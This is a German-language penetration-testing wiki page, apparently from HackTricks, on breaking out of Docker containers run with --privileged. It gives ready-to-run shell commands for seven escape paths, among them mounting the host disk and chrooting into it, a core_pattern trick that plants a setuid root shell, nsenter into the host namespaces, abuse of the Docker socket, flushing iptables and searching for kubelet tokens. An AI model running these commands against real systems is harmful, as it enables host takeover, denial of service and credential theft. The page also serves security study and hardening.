# Ausbruch aus `--privileged` Containern

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Ein Container, der mit `--privileged` gestartet wurde, ist nicht dasselbe wie ein normaler Container mit ein oder zwei zusätzlichen Berechtigungen. In der Praxis entfernt oder schwächt `--privileged` mehrere der standardmäßigen Runtime-Schutzmechanismen, die normalerweise die Workload von gefährlichen Host-Ressourcen fernhalten. Die genaue Wirkung hängt weiterhin vom Runtime und Host ab, aber bei Docker ist das übliche Ergebnis:

- alle capabilities werden gewährt
- die device cgroup-Beschränkungen werden aufgehoben
- viele Kernel-Dateisysteme werden nicht mehr read-only gemountet
- standardmäßig maskierte procfs-Pfade verschwinden
- seccomp-Filtering ist deaktiviert
- AppArmor-Confinement ist deaktiviert
- SELinux-Isolation ist deaktiviert oder durch ein deutlich breiteres Label ersetzt

Die wichtige Konsequenz ist, dass ein privilegierter Container normalerweise keinen subtilen Kernel-Exploit benötigt. In vielen Fällen kann er einfach mit Host-Geräten, hostexponierten Kernel-Dateisystemen oder Runtime-Interfaces direkt interagieren und dann in eine Host-Shell pivotieren.

## Was `--privileged` nicht automatisch ändert

`--privileged` tritt **nicht** automatisch den Host-PID-, Netzwerk-, IPC- oder UTS-Namespaces bei. Ein privilegierter Container kann weiterhin private Namespaces haben. Das bedeutet, dass einige Escape-Ketten eine zusätzliche Bedingung erfordern, wie zum Beispiel:

- ein Host bind mount
- Host-PID-Sharing
- Host-Networking
- sichtbare Host-Geräte
- beschreibbare proc/sys-Interfaces

Diese Bedingungen sind in echten Fehlkonfigurationen oft leicht zu erfüllen, sind aber konzeptionell getrennt von `--privileged` selbst.

## Escape-Pfade

### 1. Das Host-Laufwerk über exponierte Geräte mounten

Ein privilegierter Container sieht in der Regel deutlich mehr Device-Nodes unter `/dev`. Wenn das Host-Blockdevice sichtbar ist, ist der einfachste Escape, es zu mounten und per `chroot` in das Host-Dateisystem zu wechseln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Wenn die root partition nicht offensichtlich ist, liste zuerst das block layout auf:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Wenn der praktische Weg darin besteht, einen setuid-Helfer in einem beschreibbaren Host-Mount statt in ein `chroot` zu platzieren, denke daran, dass nicht jedes Dateisystem das setuid bit respektiert. Eine schnelle hostseitige capability-Prüfung ist:
```bash
mount | grep -v "nosuid"
```
Das ist nützlich, weil beschreibbare Pfade auf `nosuid`-Dateisystemen für klassische "drop a setuid shell and execute it later"-Workflows deutlich weniger interessant sind.

Die hier ausgenutzten abgeschwächten Schutzmechanismen sind:

- vollständige Gerätefreigabe
- umfangreiche capabilities, insbesondere `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Or Reuse A Host Bind Mount And `chroot`

Wenn das Root-Dateisystem des Hosts bereits im Container gemountet ist, oder wenn der Container die notwendigen Mounts erstellen kann, weil er privileged ist, ist eine Host-Shell oft nur ein `chroot` entfernt:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn kein host root bind mount vorhanden ist, aber host storage erreichbar ist, erstellen Sie einen:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Dieser Pfad missbraucht:

- geschwächte Mount-Einschränkungen
- volle capabilities
- fehlende MAC-Einschränkung

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Schreibbare `/proc/sys` oder `/sys` ausnutzen

Eine der großen Folgen von `--privileged` ist, dass die Schutzmechanismen von procfs und sysfs deutlich schwächer werden. Dadurch können Kernel-Schnittstellen, die dem Host zugänglich sind und normalerweise maskiert oder schreibgeschützt gemountet werden, freigelegt werden.

Ein klassisches Beispiel ist `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Weitere wertvolle Pfade sind:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Dieser Angriffsweg missbraucht:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

Ein privilegierter Container erhält die Capabilities, die normalerweise aus Standard-Containern entfernt werden, einschließlich `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` und vieler anderer. Das reicht häufig aus, um einen lokalen Zugang in einen host escape zu verwandeln, sobald eine weitere exponierte Angriffsfläche existiert.

Ein einfaches Beispiel ist das Mounten zusätzlicher Dateisysteme und die Verwendung von namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Wenn host PID ebenfalls geteilt ist, wird der Schritt noch kürzer:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Dieser Pfad missbraucht:

- das standardmäßige privilegierte Capability-Set
- optionales Host-PID-Sharing

Verwandte Seiten:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Ein privilegierter Container hat häufig Host-Runtime-Zustand oder Sockets sichtbar. Wenn ein Docker-, containerd- oder CRI-O-Socket erreichbar ist, ist der einfachste Ansatz oft, die Runtime-API zu verwenden, um einen zweiten Container mit Host-Zugriff zu starten:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Für containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Dieser Pfad missbraucht:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Nebeneffekte der Netzwerkisolation entfernen

`--privileged` tritt nicht von selbst dem Host-Netzwerk-Namespace bei, aber wenn der Container außerdem `--network=host` oder anderen Host-Netzwerkzugriff hat, wird der gesamte Netzwerkstack veränderbar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das führt nicht immer direkt zu einer Host-Shell, kann aber zu denial of service, traffic interception oder zum Zugriff auf nur über Loopback erreichbare Managementdienste führen.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host-Geheimnisse und Laufzeitzustand lesen

Selbst wenn ein sauberer shell escape nicht unmittelbar möglich ist, haben privilegierte Container oft ausreichend Zugriff, um Host-Geheimnisse, kubelet-Zustand, Laufzeit-Metadaten und die Dateisysteme benachbarter Container zu lesen:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Wenn `/var` auf dem Host gemountet ist oder die Laufzeitverzeichnisse sichtbar sind, kann das bereits für lateral movement oder cloud/Kubernetes credential theft ausreichen, noch bevor eine host shell erlangt wurde.

Verwandte Seiten:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Prüfungen

Der Zweck der folgenden Befehle ist, zu prüfen, welche privileged-container escape families unmittelbar nutzbar sind.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Was hier interessant ist:

- ein vollständiges Capability-Set, insbesondere `CAP_SYS_ADMIN`
- beschreibbarer Zugriff auf proc/sys
- sichtbare Host-Geräte
- fehlende seccomp- und MAC-Einschränkungen
- runtime sockets oder Bind-Mounts des Host-Root

Jedes einzelne davon kann für post-exploitation ausreichen. Mehrere zusammen bedeuten meist, dass der Container praktisch ein oder zwei Befehle von einer Kompromittierung des Hosts entfernt ist.

## Verwandte Seiten

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
